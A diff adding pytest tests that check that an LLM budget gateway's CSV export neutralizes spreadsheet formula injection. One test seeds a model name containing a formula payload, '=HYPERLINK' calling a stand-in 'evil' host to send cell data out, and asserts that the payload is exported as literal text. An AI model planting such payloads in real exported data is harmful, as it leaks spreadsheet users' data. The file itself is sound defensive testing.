@@ -23,6 +23,7 @@ import sqlite3
 from dataclasses import fields, is_dataclass
 from typing import get_type_hints
 
+import httpx
 import pytest
 from llm_budget_gateway.cost_attribution import (
     CostAttributionStore,
@@ -749,3 +750,107 @@ class TestCsvExportBehavioral:
         rows = attribution_store.ledger_rows("cus_nonexistent")
         lines = [line for line in self._to_csv(rows).strip().split("\n") if line]
         assert len(lines) == 1  # header only
+
+
+# ===========================================================================
+# SECTION 3 — CSV formula-injection neutralization (review blocker fix)
+# ===========================================================================
+
+
+class TestCsvFormulaInjectionNeutralization:
+    """The export endpoint must neutralize spreadsheet formula triggers
+    (review blocker, tech-lead t_fe28737e comment 1318).
+
+    Model and customer cells originate from client-supplied data and can
+    start with '=', '+', '-', '@', tab or CR — Excel/LibreOffice/Sheets
+    would execute those as formulas on open. The guard prefixes a single
+    apostrophe BEFORE csv.writer quoting, so the exported cell carries the
+    literal text with the apostrophe preserved.
+    """
+
+    @staticmethod
+    async def _export_csv(
+        customer_id: str, store: CostAttributionStore
+    ) -> httpx.Response:
+        """GET the live /export.csv endpoint and return the raw body."""
+        import httpx
+
+        from llm_budget_gateway.console_api import create_console_app
+
+        conn = store._conn  # noqa: SLF001
+        app = create_console_app(cost_connection=conn)
+        async with httpx.AsyncClient(
+            transport=httpx.ASGITransport(app=app), base_url="http://console"
+        ) as client:
+            return await client.get(
+                f"/v1/product/customers/{customer_id}/export.csv"
+            )
+
+    @staticmethod
+    def _seed_customer_with_rows(
+        store: CostAttributionStore, *, customer_name: str, model: str
+    ) -> str:
+        """Create a customer + one ledger row with the given hostile values."""
+        conn = store._conn  # noqa: SLF001
+        customer_id = store.create_customer(customer_name)["id"]
+        conn.execute(
+            """
+            INSERT INTO cost_records (
+                request_id, api_key, user_id, team, model, provider,
+                prompt_tokens, completion_tokens, total_tokens, reasoning_tokens,
+                input_cost, output_cost, reasoning_cost, total_cost, latency_ms,
+                status, status_code, timestamp, tool_name, project, route,
+                client_id, client_profile, cache_hit, conversation_id, customer_id
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """,
+            (
+                "req-evil", "sk_test", None, None, model, "openai",
+                100, 50, 150, 0, 0.4, 0.6, 0.0, 1.0, 120,
+                "success", None, 1_700_000_000, None, None, "route-default",
+                "client-a", "default", 0, None, customer_id,
+            ),
+        )
+        conn.commit()
+        return customer_id
+
+    @pytest.mark.asyncio
+    async def test_model_cell_formula_injection_neutralized(
+        self, attribution_store
+    ):
+        """A model named '=HYPERLINK(...)' must export as the literal text
+        with a leading apostrophe — not as a live formula."""
+        payload = '=HYPERLINK("http://evil/?c="&A1)'
+        customer_id = self._seed_customer_with_rows(
+            attribution_store, customer_name="Acme Corp", model=payload
+        )
+        response = await self._export_csv(customer_id, attribution_store)
+        assert response.status_code == 200
+        rows = list(csv.reader(io.StringIO(response.text)))
+        assert rows[0] == ["customer", "timestamp", "model", "tokens", "cost"]
+        assert rows[1][2] == f"'{payload}"  # apostrophe preserved
+
+    @pytest.mark.asyncio
+    async def test_customer_name_plus_prefixed_neutralized(
+        self, attribution_store
+    ):
+        """A customer name starting with '+' must be neutralized too."""
+        customer_id = self._seed_customer_with_rows(
+            attribution_store, customer_name="+SUM(A1:A9)", model="gpt-4o"
+        )
+        response = await self._export_csv(customer_id, attribution_store)
+        assert response.status_code == 200
+        rows = list(csv.reader(io.StringIO(response.text)))
+        assert rows[1][0] == "'+SUM(A1:A9)"  # apostrophe preserved
+
+    @pytest.mark.asyncio
+    async def test_export_contract_unchanged(self, attribution_store):
+        """AC#3 contract: exact header, attachment disposition, text/csv."""
+        customer_id = self._seed_customer_with_rows(
+            attribution_store, customer_name="Acme Corp", model="gpt-4o"
+        )
+        response = await self._export_csv(customer_id, attribution_store)
+        assert response.status_code == 200
+        assert response.headers["content-type"].startswith("text/csv")
+        assert "attachment" in response.headers["content-disposition"]
+        rows = list(csv.reader(io.StringIO(response.text)))
+        assert rows[0] == ["customer", "timestamp", "model", "tokens", "cost"]
